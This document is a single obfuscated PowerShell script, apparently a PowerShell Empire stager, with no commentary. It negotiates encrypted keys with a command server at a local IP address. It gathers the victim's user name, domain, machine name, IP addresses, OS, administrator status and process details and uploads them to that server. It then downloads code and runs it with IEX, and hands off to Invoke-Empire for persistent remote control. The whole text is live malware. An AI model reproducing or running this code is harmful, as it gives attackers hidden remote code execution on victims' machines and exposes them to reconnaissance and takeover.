FUNCtiOn STARt-NegOtIAtE{param($s,$SK,$UA="lol")AdD-Type -AsSeMbLY SYSteM.SeCUrItY;AdD-TyPe -asseMBLy SYStEM.COre;$ErrorActionPreference = "SilentlyContinue";$E=[SYstem.TExt.ENCOdinG]::ASCII;$AES=NeW-OBJect SyStEM.SECURity.CRYPtoGrapHy.AesCRYptoSErvIcEPRoviDer;$IV = [byte] 0..255 | GEt-RANdOm -COunt 16;$AES.Mode="CBC"; $AES.Key=$e.GetBytes($SK); $AES.IV = $IV;$csP = NEw-ObJeCT SYstem.SECurity.CRYPtOGRAphY.CsPPARaMeters;$csp.FlAgS = $CSp.FLaGs -boR [SYStEm.SEcuriTy.CryPTogRAPhy.CSPPrOviderFlaGs]::USEMaChiNeKeYSTOre;$rS = NEW-OBjECt SyStEM.SecuriTy.CRyPTOGrapHy.RSACrYPtoSeRviCePRoVIDER -ArgUmENTLIsT 2048,$cSP;$Rk=$Rs.ToXmLStRIng($FAlSE);$r=1..16|ForEACh-ObJEcT{Get-RanDoM -Max 26};$ID=('ABCDEFGHKLMNPRSTUVWXYZ123456789'[$R] -jOIN '');$iB=$E.getBytES($Rk);$EB=$IV+$AES.CrEAtEENCRyPToR().TRAnSForMFinAlBlock($IB,0,$ib.LENGth);If(-not $Wc){$wc=nEW-ObJEct SySTeM.Net.WEBCLiEnt;$wc.PROXY = [SySTeM.NEt.WebReqUESt]::GETSysTEMWEbProxY();$WC.ProXy.CrEDeNtiAlS = [SysteM.NEt.CREdeNTIaLCaCHE]::DEFaUlTCrEdENTialS;}$wc.Headers.Add("User-Agent",$UA);$wc.Headers.Add("Cookie","SESSIONID=$ID");$raw=$wc.UploadData($s+"index.jsp","POST",$eb);$de=$e.GeTSTrInG($rS.dEcRypT($raw,$FalsE));$EpoCH=$dE[0..9] -JOiN'';$KEY=$dE[10..$dE.leNgTh] -JOIN '';$AES=New-OBject SYsTEM.SECuRIty.CRYPTogrApHy.AEsCrYpToSeRviCEProvIDeR;$IV = [byTE] 0..255 | Get-RAndoM -cOUNt 16;$AES.Mode="CBC"; $AES.Key=$e.GetBytes($key); $AES.IV = $IV;$i=$S+'|'+[EnVIroNmeNT]::UsErDOmainNAmE+'|'+[EnVirOnMeNt]::USERNAME+'|'+[EnvIrOnMeNT]::MAChINENamE;$p=(GWmI Win32_NeTwoRKAdAPtERCoNfiGuRatiON|WhERE{$_.IPAdDREss}|SElecT -EXpANd IPAddreSS);$Ip = @{$TrUE=$p[0];$fALsE=$P}[$P.LENgTH -lt 6];if(!$IP -or $iP.trIm() -eQ '') {$ip='0.0.0.0'};$i+="|$ip";$i+='|'+(GEt-WmIObJECT Win32_OPERaTingSysTem).NAme.SpLIt('|')[0];if(([Environment]::UserName).ToLower() -eq "system"){$i+='|True'}else {$i += "|" +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}$N=[System.DIagNostICS.PRocEss]::GeTCUrrEntPRoCeSs();$I+='|'+$N.PRoCeSsName+'|'+$N.ID;$I += '|' + $PSVERsIonTAble.PSVerSiON.MAjor;$iB2=$E.geTbyteS($i);$EB2=$IV+$AES.CrEatEENCRyptOr().TRansfORMFINAlBlOcK($Ib2,0,$iB2.LEngTH);$wc.Headers.Add("User-Agent",$UA);$raw=$wc.UploadData($s+"index.php","POST",$eb2);$AES=NeW-OBjEct SYSTeM.SECURIty.CrYPtOGraphY.AESCryPTOSERvICEPRoViDER;$AES.Mode="CBC";$IV = $rAW[0..15];$AES.Key=$E.GetByTes($kEY);$AES.IV = $IV;IEX $([SYsTEm.TExt.ENcOdInG]::ASCII.GeTSTRiNG( $($AES.CrEAteDecRYPtoR().TraNSFORmFInaLBLock($raw[16..$RaW.LenGTH],0,$Raw.LeNGtH-16))));$AES=$Null;$s2=$null;$WC=$nULL;$EB2=$Null;$rAW=$NULl;$IV=$nULl;$wC=$NulL;$I=$nuLl;$ib2=$nuLL;[GC]::ColLECt();Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -SessionKey $key -SessionID $ID -Epoch $epoch;} Start-Negotiate -s "http://192.168.2.7:8080:8080/" -SK '3e*GkYLUSv6ab4OK!%Pi@$tq9\>|~u+R' -UA $u;
